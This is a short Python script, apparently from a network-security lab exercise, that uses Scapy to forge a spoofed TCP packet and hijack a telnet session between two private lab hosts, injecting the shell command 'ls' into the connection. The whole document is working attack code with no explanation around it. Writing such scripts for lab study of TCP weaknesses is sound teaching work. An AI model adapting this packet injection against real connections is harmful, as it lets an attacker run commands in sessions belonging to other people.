#!/usr/bin/python3
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")
ip  = IP(src="10.9.0.3", dst="10.9.0.2")
tcp = TCP(sport=41768, dport=23, flags="A", seq=1141611840, ack=4174647818)
data = "\n ls\n"
pkt = ip/tcp/data
send(pkt, verbose=0, iface="br-6c895804349d")



